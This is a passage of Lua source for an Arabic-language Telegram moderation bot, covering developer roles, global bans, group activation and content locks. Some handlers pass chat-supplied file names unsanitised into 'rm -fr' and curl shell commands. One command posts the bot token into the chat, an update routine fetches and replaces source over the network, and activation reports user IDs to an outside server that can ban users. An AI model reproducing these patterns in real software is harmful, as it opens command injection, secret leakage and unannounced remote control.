io.popen("rm -fr files_SNIEBR/"..name_t[2]..'.lua')
datahmade:srem("files"..bot_id,name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, "✖┇تم حذف {"..name_t[2]..".lua}", 1, 'html')
end
if (msg.content_.text_ == 'اضف ملف' ) then
send(msg.chat_id_, msg.id_, 1, " 📥┇ ارسل ملف الان", 1, 'html')
datahmade:set("addfiel"..msg.sender_user_id_,"yes")
end
if text:match("^(جلب ملف) (.*)(.lua)$") then
local name_t = {string.match(text, "^(جلب ملف) (.*)(.lua)$")}
send(msg.chat_id_, msg.id_, 1, "🕡┇ انتظر بعض الوقت وسيتم جلب \n 📁┇ملف : {"..name_t[2]..".lua}", 1, 'html')
local SNIEBRe = 'https://api.telegram.org/bot' .. token .. '/sendDocument'
local curl = 'curl "' .. SNIEBRe .. '" -F "chat_id=' .. msg.chat_id_ .. '" -F "document=@' .. 'files_SNIEBR/'..name_t[2]..'.lua' .. '"'
io.popen(curl)
end

if text:match("^اضف مطور$")  and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
if redis:sismember('SNIEBR:'..bot_id..'dev', result.sender_user_id_) then
tsX000("prore",msg,'☑┇بالفعل تم رفعه مطور')
else
redis:set('SNIEBR:'..bot_id..'sudoo'..result.sender_user_id_..'', 'yes')
redis:sadd('SNIEBR:'..bot_id..'dev', result.sender_user_id_)
tsX000("prore",msg,'☑┇تم رفعه مطور')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end

if text:match("^اضف مطور @(.*)$")  then
local apmd = {string.match(text, "^(اضف مطور) @(.*)$")}
function promote_by_username(extra, result, success)
if result.id_ then
redis:set('SNIEBR:'..bot_id..'sudoo'..result.id_..'', 'yes')
redis:sadd('SNIEBR:'..bot_id..'dev', result.id_)
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'SNIEBR_files')..')\n\n☑┇تم رفعه مطور'
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(apmd[2],promote_by_username)
end
if text:match("^اضف مطور (%d+)$")   then
local apmd = {string.match(text, "^(اضف مطور) (%d+)$")}
redis:set('SNIEBR:'..bot_id..'sudoo'..apmd[2]..'', 'yes')
redis:sadd('SNIEBR:'..bot_id..'dev', apmd[2])
tsX000(apmd[2],msg,'☑┇تم رفعه مطور')
end

if text:match("^حذف مطور$")  and msg.reply_to_message_id_ then
function demote_by_reply(extra, result, success)
if not redis:sismember('SNIEBR:'..bot_id..'dev', result.sender_user_id_) then
tsX000("prore",msg,'☑┇ بالفعل تم تنزيله من المطورين')
else
redis:del('SNIEBR:'..bot_id..'sudoo'..result.sender_user_id_..'', 'no')
redis:srem('SNIEBR:'..bot_id..'dev', result.sender_user_id_)
tsX000("prore",msg,'☑┇ تم تنزيله من مطورين البوت')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,demote_by_reply)
end

if text:match("^حذف مطور @(.*)$")  then
local apmd = {string.match(text, "^(حذف مطور) @(.*)$")}
function demote_by_username(extra, result, success)
if result.id_ then
redis:del('SNIEBR:'..bot_id..'sudoo'..result.id_..'', 'no')
redis:srem('SNIEBR:'..bot_id..'dev', result.id_)
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'SNIEBR_files')..')\n☑┇ تم تنزيله من مطورين البوت'
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(apmd[2],demote_by_username)
end  
if text:match("^حذف مطور (%d+)$")  then
local apmd = {string.match(text, "^(حذف مطور) (%d+)$")}
redis:del('SNIEBR:'..bot_id..'sudoo'..apmd[2]..'', 'no')
redis:srem('SNIEBR:'..bot_id..'dev', apmd[2])
tsX000(apmd[2],msg,'☑┇ تم تنزيله من مطورين البوت')
end
if text:match("^حظر عام$")   and msg.reply_to_message_id_ then
function gban_by_reply(extra, result, success)
if result.sender_user_id_ == tonumber(sudo_add) then
send(msg.chat_id_, msg.id_, 1, "📮┇لا يمكنك حظر المطور الاساسي \n", 1, 'md')
return false 
end
local hash =  'SNIEBR:'..bot_id..'gbanned:'
if is_admin(result) then
send(msg.chat_id_, msg.id_, 1, '❕┇لا تستطيع حظر عام \n🔘┇(مدراء،ادمنيه،اعضاء مميزين)البوت', 1, 'md')
else
datahmade:sadd(hash, result.sender_user_id_)
chat_kick(result.chat_id_, result.sender_user_id_)
tsX000("prore",msg,"🚫┇تم حظره من مجموعات البوت")
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,gban_by_reply)
end
if text:match("^ارسل التوكن$")  then
send(msg.chat_id_, msg.id_, 1, token, 1, 'html')
end
if text:match("^حظر عام @(.*)$")   then
local apbll = {string.match(text, "^(حظر عام) @(.*)$")}
function gban_by_username(extra, result, success)
if result.id_ then
if result.id_ == tonumber(sudo_add) then
send(msg.chat_id_, msg.id_, 1, "📮┇لا يمكنك حظر المطور الاساسي \n", 1, 'md')
return false 
end
if ck_admin(result.id_) then
send(msg.chat_id_, msg.id_, 1, '❕┇لا تستطيع حظر عام \n🔘┇(مدراء،ادمنيه،اعضاء مميزين)البوت', 1, 'md')
else
local hash =  'SNIEBR:'..bot_id..'gbanned:'
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apbll[2] or 'SNIEBR_files')..')\n🚫┇تم حظره من المجموعات البوت'
datahmade:sadd(hash, result.id_)
end
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(apbll[2],gban_by_username)
end

if text:match("^حظر عام (%d+)$")   then
local apbll = {string.match(text, "^(حظر عام) (%d+)$")}
local hash =  'SNIEBR:'..bot_id..'gbanned:'
if ck_admin(apbll[2]) then
if apbll[2] == tonumber(sudo_add) then
send(msg.chat_id_, msg.id_, 1, "📮┇لا يمكنك حظر المطور الاساسي \n", 1, 'md')
return false 
end
send(msg.chat_id_, msg.id_, 1, '❕┇لا تستطيع حظر عام \n🔘┇(مدراء،ادمنيه،اعضاء مميزين)البوت', 1, 'md')
else
datahmade:sadd(hash, apbll[2])
tsX000(apbll[2],msg,"🚫┇تم حظره من المجموعات البوت")
end
end
if text:match("^الغاء العام$")   and msg.reply_to_message_id_ then
function ungban_by_reply(extra, result, success)
local hash =  'SNIEBR:'..bot_id..'gbanned:'
tsX000("prore",msg,"🚫┇تم الغاء حظره من المجموعات البوت")
datahmade:srem(hash, result.sender_user_id_)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,ungban_by_reply)
end

if text:match("^الغاء العام @(.*)$")   then
local apid = {string.match(text, "^(الغاء العام) @(.*)$")}
function ungban_by_username(extra, result, success)
local hash =  'SNIEBR:'..bot_id..'gbanned:'
if result.id_ then
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apid[2] or 'SNIEBR_files')..')\n��┇تم الغاء حظره من المجموعات البوت'
datahmade:srem(hash, result.id_)
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(apid[2],ungban_by_username)
end

if text:match("^الغاء العام (%d+)$")   then
local apbll = {string.match(text, "^(الغاء العام) (%d+)$")}
local hash =  'SNIEBR:'..bot_id..'gbanned:'
datahmade:srem(hash, apbll[2])
tsX000(apbll[2],msg,"🚫┇تم الغاء حظره من مجموعات البوت")
end
if text:match("^تحديث السورس$")  then
send(msg.chat_id_, msg.id_, 1, '☑️┇تم التحديث', 1, 'md')
os.execute('rm -rf ./libs/utils.lua')
os.execute('cd libs && wget https://raw.githubusercontent.com/SNIEBRTEAM/SNIEBR/master/libs/utils.lua')
os.execute('rm -rf SNIEBR.lua')
os.execute('wget https://raw.githubusercontent.com/SNIEBRTEAM/SNIEBR/master/SNIEBR.lua')
os.exit()
return false
end
if text == "تفعيل"  then
function TSby(extra,result,success)
info = '👤┇بواسطه ← ['..result.first_name_..'](t.me/'..(result.username_ or 'SNIEBR')..')\n'
if datahmade:get( 'SNIEBR:'..bot_id.."charge:"..msg.chat_id_) then
function thsake_info(k1,k2)
send(msg.chat_id_, msg.id_, 1, "❕┇المجموعه {"..(k2.title_ or "").."} مفعله سابقا", 1, 'md')
end
openChat(msg.chat_id_,thsake_info)
end
if not datahmade:get( 'SNIEBR:'..bot_id.."charge:"..msg.chat_id_) then
datahmade:set( 'SNIEBR:'..bot_id.."charge:"..msg.chat_id_,true)
function thsake_info(k1,k2)
send(msg.chat_id_, msg.id_, 1, info.."☑️┇تم تفعيل المجموعه {"..(k2.title_ or "").."}", 1, 'md')
end
openChat(msg.chat_id_,thsake_info)
function thsake_info2(k1,k2)
function dl_cb222(t1,t2)
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
  t2.invite_link_ = link.result
end
end
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, dl_cb222, nil)
end
openChat(msg.chat_id_,thsake_info2) 
--
datahmade:sadd("thsake:gog"..bot_id, msg.chat_id_)
datahmade:set( 'SNIEBR:'..bot_id.."enable:"..msg.chat_id_,true)
end end
getUser(msg.sender_user_id_, TSby)
end
end
end
if (text == 'تفعيل') and not is_sudo(msg) then
local res = https.request('https://SNIEBR.ga/SNIEBR.php?id='..msg.sender_user_id_..'')
 
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
return false end
if res == 'kicked' then
 hash =  'SNIEBR:'..bot_id..'gbanned:'
datahmade:sadd(hash, msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1,'عذراً انتا محظور من جميع بوتات السورس \n راسل مطورين السورس لمعرفه سبب الحظر @SNIEBRbbot', 1, 'html')   
return false end
end
function TSby(extra,result,success)
info = '👤┇بواسطه ← ['..result.first_name_..'](t.me/'..(result.username_ or 'SNIEBR')..')\n'
local keko2 = datahmade:get("add"..bot_id)
if keko2 then
local keko = "https://api.telegram.org/bot" ..token.. '/getChatMember?chat_id=' .. msg.chat_id_ .. '&user_id='..msg.sender_user_id_
local stats = https.request(keko)
local data = json:decode(stats)
if (data.result and data.result.can_promote_members or data.result.status == 'creator') then
local keko = "https://api.telegram.org/bot" ..token.. '/getChatMembersCount?chat_id=' .. msg.chat_id_
local stats = https.request(keko)
local data2 = json:decode(stats)
local kekon = datahmade:get("ts_a"..bot_id) or 1000
if (data2.result and (tonumber(data2.result) == tonumber(kekon) or tonumber(data2.result) > tonumber(kekon))) then
if datahmade:get( 'SNIEBR:'..bot_id.."charge:"..msg.chat_id_) then
function thsake_info(k1,k2)
send(msg.chat_id_, msg.id_, 1, "❕┇المجموعه {"..(k2.title_ or "").."} مفعله سابقا", 1, 'md')
end
openChat(msg.chat_id_,thsake_info)
end
if not datahmade:get( 'SNIEBR:'..bot_id.."charge:"..msg.chat_id_) then
datahmade:set( 'SNIEBR:'..bot_id.."charge:"..msg.chat_id_,true)
function thsake_info(k1,k2)
send(msg.chat_id_, msg.id_, 1, info.."☑️┇تم تفعيل المجموعه {"..(k2.title_ or "").."}", 1, 'md')
end
openChat(msg.chat_id_,thsake_info)
datahmade:sadd("thsake:gog"..bot_id, msg.chat_id_)
function thsake_info2(k1,k2)
function dl_cb222(t1,t2)
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
  t2.invite_link_ = link.result
end
end
datahmade:set('SNIEBR:'..bot_id.."group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
send(tostring((datahmade:get("SNIEBR"..bot_id..":sudo:gr") or sudo_add)), 0, 1, "🔘┇قام بتفعيل مجموعه \n🎫┇ايدي المنشئ ~⪼ ("..msg.sender_user_id_..")\n☑️┇معرف المنشئ ~⪼ @"..(result.username_ or "لا يوجد").."\n🌐┇معلومات المجموعه \n\n🎫┇ايدي المجموعه ~⪼ ("..msg.chat_id_..")\nⓂ️┇اسم المجموعه ~⪼ ("..k2.title_..")\n📎┇رابط المجموعه ~⪼ ["..(t2.invite_link_ or "Error").."]" , 1, 'html')
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, dl_cb222, nil)
end
openChat(msg.chat_id_,thsake_info2) 
--
if data.result.can_promote_members  then
datahmade:sadd('SNIEBR:'..bot_id..'owners:'..msg.chat_id_,msg.sender_user_id_)
end
datahmade:set( 'SNIEBR:'..bot_id.."enable:"..msg.chat_id_,true)
if data.result.status == 'creator' then
datahmade:sadd('SNIEBR:'..bot_id..'creator:'..msg.chat_id_, msg.sender_user_id_)
datahmade:sadd('SNIEBR:'..bot_id..'creatorbasic:'..msg.chat_id_, msg.sender_user_id_)
end
end
else
send(msg.chat_id_, msg.id_, 1, "⚠️┇المجموعه قليله لا يمكن تفعيلها", 1, 'md')
end
else
send(msg.chat_id_, msg.id_, 1, "⚠️┇انت لست (منشئ او مدير) في المجموعة", 1, 'md')
end
end
end
getUser(msg.sender_user_id_, TSby)
end
if text == "تفعيل" and is_sudo(msg) then
local res = https.request('https://SNIEBR.ga/SNIEBR.php?id='..msg.sender_user_id_..'')
 
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
return false end
if res == 'kicked' then
 hash =  'SNIEBR:'..bot_id..'gbanned:'
datahmade:sadd(hash, msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1,'عذراً انتا محظور من جميع بوتات السورس \n راسل مطورين السورس لمعرفه سبب الحظر @SNIEBRbbot', 1, 'html')   
return false end
end
function TSby(extra,result,success)
info = '👤┇بواسطه ← ['..result.first_name_..'](t.me/'..(result.username_ or 'SNIEBR')..')\n'
if datahmade:get( 'SNIEBR:'..bot_id.."charge:"..msg.chat_id_) then
function thsake_info(k1,k2)
send(msg.chat_id_, msg.id_, 1, "❕┇المجموعه {"..(k2.title_ or "").."} مفعله سابقا", 1, 'md')
end
openChat(msg.chat_id_,thsake_info)
end
if not datahmade:get( 'SNIEBR:'..bot_id.."charge:"..msg.chat_id_) then
datahmade:set( 'SNIEBR:'..bot_id.."charge:"..msg.chat_id_,true)
function thsake_info(k1,k2)
send(msg.chat_id_, msg.id_, 1, info.."☑️┇تم تفعيل المجموعه {"..(k2.title_ or "").."}", 1, 'md')
end
openChat(msg.chat_id_,thsake_info)
function thsake_info2(k1,k2)
function dl_cb222(t1,t2)
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
  t2.invite_link_ = link.result
end
end
datahmade:set('SNIEBR:'..bot_id.."group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
send(tostring((datahmade:get("SNIEBR"..bot_id..":sudo:gr") or sudo_add)), 0, 1, "🔘┇قام بتفعيل مجموعه \n🎫┇ايدي مطور ~⪼ ("..msg.sender_user_id_..")\n📜┇معرف المطور ~⪼ @"..(result.username_ or "لا يوجد").."\n🌐┇معلومات المجموعه \n\n🎫┇ايدي المجموعه ~⪼ ("..msg.chat_id_..")\nⓂ️┇اسم المجموعه ~⪼ ("..k2.title_..")\n📎┇رابط المجموعه ~⪼ ["..(t2.invite_link_ or "Error").."]" , 1, 'html')
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, dl_cb222, nil)
end
openChat(msg.chat_id_,thsake_info2) 
--
datahmade:sadd("thsake:gog"..bot_id, msg.chat_id_)
datahmade:set( 'SNIEBR:'..bot_id.."enable:"..msg.chat_id_,true)
end end
getUser(msg.sender_user_id_, TSby)
end
if text == "تعطيل" and is_sudo(msg) then
local res = https.request('https://SNIEBR.ga/SNIEBR.php?id='..msg.sender_user_id_..'')
 
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
return false end
if res == 'kicked' then
 hash =  'SNIEBR:'..bot_id..'gbanned:'
datahmade:sadd(hash, msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1,'عذراً انتا محظور من جميع بوتات السورس \n راسل مطورين السورس لمعرفه سبب الحظر @SNIEBRbbot', 1, 'html')   
return false end
end
function TSby(extra,result,success)
info = '👁‍🗨※بواسطه ← ['..result.first_name_..'](t.me/'..(result.username_ or 'SNIEBR_files')..')\n'
if not datahmade:get( 'SNIEBR:'..bot_id.."charge:"..msg.chat_id_) then
function thsake_info(k1,k2)
send(msg.chat_id_, msg.id_, 1, "❕┇المجموعه {"..(k2.title_ or "").."} معطله سابقا", 1, 'md')
end
openChat(msg.chat_id_,thsake_info)
end
if datahmade:get( 'SNIEBR:'..bot_id.."charge:"..msg.chat_id_) then
datahmade:del( 'SNIEBR:'..bot_id.."charge:"..msg.chat_id_)
function thsake_info(k1,k2)
send(msg.chat_id_, msg.id_, 1, info.."☑️┇تم تعطيل المجموعه {"..k2.title_.."}", 1, 'md')
end
openChat(msg.chat_id_,thsake_info)
datahmade:srem("thsake:gog"..bot_id, msg.chat_id_)
--
function thsake_info2(k1,k2)
function dl_cb222(t1,t2)
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
  t2.invite_link_ = link.result
end
end
datahmade:set('SNIEBR:'..bot_id.."group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
send(tostring((datahmade:get("SNIEBR"..bot_id..":sudo:gr") or sudo_add)), 0, 1, "🔘┇قام تعطيل مجموعه \n🎫┇ايدي مطور ~⪼ ("..msg.sender_user_id_..")\n📜┇معرف المطور ~⪼ @"..(result.username_ or "لا يوجد").."\n🌐┇معلومات المجموعه \n\n🎫┇ايدي المجموعه ~⪼ ("..msg.chat_id_..")\nⓂ️┇اسم المجموعه ~⪼ ("..k2.title_..")\n📎┇رابط المجموعه ~⪼ ["..(t2.invite_link_ or "Error").."]" , 1, 'html')
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, dl_cb222, nil)
end
openChat(msg.chat_id_,thsake_info2) 
--
end 
end
getUser(msg.sender_user_id_, TSby)
end
end
function TSlocks(msg) -- Function locks && unlocks
local text = msg.content_.text_
if text then
--         »»               Start SNIEBR lock                       ««              --
if (text == "قفل التاك") then
local tsX_o = datahmade:get("lock_tag:SNIEBR"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🔐┇ بالفعل تم قفل التاك ")
else
tsX000("lock",msg,"🔐┇ تم قفل التاك ")
datahmade:set("lock_tag:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الرد") then
local tsX_o = datahmade:get("lock_reple:SNIEBR"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🔐┇ بالفعل تم قفل الرد على الرسائل ")
else
tsX000("lock",msg,"🔐┇ تم قفل الرد على الرسائل ")
datahmade:set("lock_reple:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الشارحه") then
local tsX_o = datahmade:get("lock_sarha:SNIEBR"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🔐┇ بالفعل تم قفل الشارحه ")
else
tsX000("lock",msg,"🔐┇ تم قفل الشارحه ")
datahmade:set("lock_sarha:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الكلايش") then
local tsX_o = datahmade:get("lock_word:SNIEBR"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🔐┇ بالفعل تم قفل الكلايش ")
else
tsX000("lock",msg,"🔐┇ تم قفل الكلايش ")
datahmade:set("lock_word:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل التعديل") and (is_creator(msg) or is_creatorbasic(msg)) then
local tsX_o = datahmade:get("lock_edit:SNIEBR"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🔐┇ بالفعل تم قفل التعديل ")
else
tsX000("lock",msg,"🔐┇تم قفل التعديل ")
datahmade:set("lock_edit:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل التكرار") then
local tsX_o = datahmade:get("lock_lllll:SNIEBR"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🔐┇ بالفعل تم قفل التكرار ")
else
tsX000("lock",msg,"🔐┇ تم قفل التكرار ")
datahmade:set("lock_lllll:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل المتحركه") then
local tsX_o = datahmade:get("lock_gif:SNIEBR"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🔐┇ بالفعل تم قفل المتحركه ")
else
tsX000("lock",msg,"🔐┇ تم قفل المتحركه ")
datahmade:set("lock_gif:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الملفات") then
local tsX_o = datahmade:get("lock_files:SNIEBR"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🔐┇ بالفعل تم قفل الملفات ")
else
tsX000("lock",msg,"🔐┇ تم قفل الملفات ")
datahmade:set("lock_files:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الماركدون") then
local tsX_o = datahmade:get("lock_mark:SNIEBR"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🔐┇ بالفعل تم قفل الماركدون ")
else
tsX000("lock",msg,"🔐┇ تم قفل الماركدون ")
datahmade:set("lock_mark:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الصور") then
local tsX_o = datahmade:get("lock_photo:SNIEBR"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🔐┇ بالفعل تم قفل الصور ")
else
tsX000("lock",msg,"🔐┇ تم قفل الصور ")
datahmade:set("lock_photo:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الملصقات") then
local tsX_o = datahmade:get("lock_stecker:SNIEBR"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🔐┇ بالفعل تم قفل الملصقات ")
else
tsX000("lock",msg,"🔐┇ تم قفل الملصقات ")
datahmade:set("lock_stecker:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الفيديو") then
local tsX_o = datahmade:get("lock_video:SNIEBR"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🔐┇ بالفعل تم قفل الفيديو ")
else
tsX000("lock",msg,"🔐┇ تم قفل الفيديو ")
datahmade:set("lock_video:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الانلاين") then
local tsX_o = datahmade:get("lock_inline:SNIEBR"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🔐┇ بالفعل تم قفل الانلاين ")
else
tsX000("lock",msg,"🔐┇ تم قفل الانلاين ")
datahmade:set("lock_inline:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الدردشه") then
local tsX_o = datahmade:get("lock_chat:SNIEBR"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🔐┇ بالفعل تم قفل الدردشه ")
else
tsX000("lock",msg,"🔐┇ تم قفل الدردشه ")
datahmade:set("lock_chat:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل التوجيه") then
local tsX_o = datahmade:get("lock_fwd:SNIEBR"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🔐┇ بالفعل تم قفل التوجيه ")
else
tsX000("lock",msg,"🔐┇ تم قفل التوجيه ")
datahmade:set("lock_fwd:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل التثبيت") then
local tsX_o = datahmade:get("lock_pin:SNIEBR"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🔐┇ بالفعل تم قفل التثبيت ")
else
tsX000("lock",msg,"🔐┇ تم قفل التثبيت ")
datahmade:set("lock_pin:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الاغاني") then
local tsX_o = datahmade:get("lock_audeo:SNIEBR"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🔐┇ بالفعل تم قفل الاغاني ")
else
tsX000("lock",msg,"🔐┇ تم قفل الاغاني ")
datahmade:set("lock_audeo:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الصوت") then
local tsX_o = datahmade:get("lock_voice:SNIEBR"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🔐┇ بالفعل تم قفل الصوت ")
else
tsX000("lock",msg,"🔐┇ تم قفل الصوت ")
datahmade:set("lock_voice:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الجهات") then
local tsX_o = datahmade:get("lock_contact:SNIEBR"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🔐┇ بالفعل تم قفل الجهات ")
else
tsX000("lock",msg,"🔐┇ تم قفل الجهات ")
datahmade:set("lock_contact:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل العربيه") then
local tsX_o = datahmade:get("lock_ar:SNIEBR"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🔐┇ بالفعل تم قفل العربيه ")
else
tsX000("lock",msg,"🔐┇ تم قفل العربيه ")
datahmade:set("lock_ar:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الانكليزيه") then
local tsX_o = datahmade:get("lock_en:SNIEBR"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🔐┇ بالفعل تم قفل الانكليزيه ")
else
tsX000("lock",msg,"🔐┇ تم قفل الانكليزيه ")
datahmade:set("lock_en:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الميديا") then
local tsX_o = datahmade:get("lock_media:SNIEBR"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🔐┇ بالفعل تم قفل الميديا ")
else
tsX000("lock",msg,"🔐┇ تم قفل الميديا ")
datahmade:set("lock_media:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_audeo:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_video:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_photo:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_stecker:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_voice:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_gif:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_note:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الروابط") then
local tsX_o = datahmade:get("lock_link:SNIEBR"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🔐┇ بالفعل تم قفل الروابط ")
else
tsX000("lock",msg,"🔐┇ تم قفل الروابط ")
datahmade:set("lock_link:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل المعرف") then
local tsX_o = datahmade:get("lock_username:SNIEBR"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🔐┇ بالفعل تم قفل المعرف ")
else
tsX000("lock",msg,"🔐┇ تم قفل المعرف ")
datahmade:set("lock_username:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الاشعارات") then
local tsX_o = datahmade:get("lock_new:SNIEBR"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🔐┇ بالفعل تم قفل الاشعارات ")
else
tsX000("lock",msg,"🔐┇ تم قفل الاشعارات ")
datahmade:set("lock_new:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل البوتات بالطرد") then
local tsX_o = datahmade:get("lock_botAndBan:SNIEBR"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🔐┇ بالفعل تم قفل البوتات بالطرد ")
else
tsX000("lock",msg,"🔐┇ تم قفل البوتات بالطرد ")
datahmade:set("lock_botAndBan:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل البوتات") then
local tsX_o = datahmade:get("lock_bot:SNIEBR"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🔐┇ بالفعل تم قفل البوتات ")
else
tsX000("lock",msg,"🔐┇ تم قفل البوتات ")
datahmade:set("lock_bot:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الدخول") then
local tsX_o = datahmade:get("lock_join:SNIEBR"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🔐┇ بالفعل تم قفل الدخول للمجموعه ")
else
tsX000("lock",msg,"🔐┇ تم قفل الدخول للمجموعه ")
datahmade:set("lock_join:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل بصمه الفيديو") then
local tsX_o = datahmade:get("lock_note:SNIEBR"..msg.chat_id_..bot_id)
if tsX_o then
